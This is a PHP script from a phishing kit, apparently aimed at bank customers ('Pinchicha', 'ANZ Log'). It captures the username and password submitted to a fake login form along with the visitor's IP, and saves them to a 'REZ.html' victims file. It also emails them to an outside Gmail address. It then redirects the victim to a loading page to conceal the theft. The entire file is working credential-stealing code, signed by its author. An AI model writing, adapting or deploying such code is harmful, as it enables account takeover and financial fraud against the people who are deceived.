<?php
$ip = getenv("REMOTE_ADDR");
$msg .= "\n";
$msg .= "LOGIN: ".$_POST['user']."\n";
$msg .= "Password: ".$_POST['pass']."\n";
$msg .= "\n";
$msg .= "IP: ".$ip."\n";
$msg .= "-------Built By ThePunisher-------\n";



$message_pp = "<hr size=\"3\" width=\"50%\" align=\"left\" noshade=\"noshade\" color=\"#006600\"><br />
<font color=\"red\">-----------------|Pinchicha|-----------------</font><br />

LOGIN : ".$_POST['user']." <br />
Password : ".$_POST['pass']." <br />

ip: ".$ip."<br />

<font color=\"red\">-----------------|ANZ Log|-----------------</font><br />";


$victimes = fopen("REZ.html","a");
fwrite($victimes,$message_pp);
fclose($victimes);





$post = "cgm72164@gmail.com";
$subj = "Pinchicha - ReZuLTz\n";
$from = "From: $ip<Thepunisher@mail.com>";
mail("$post",$subj, $msg, $from); 
header("Location: loading1.php");	  

?>
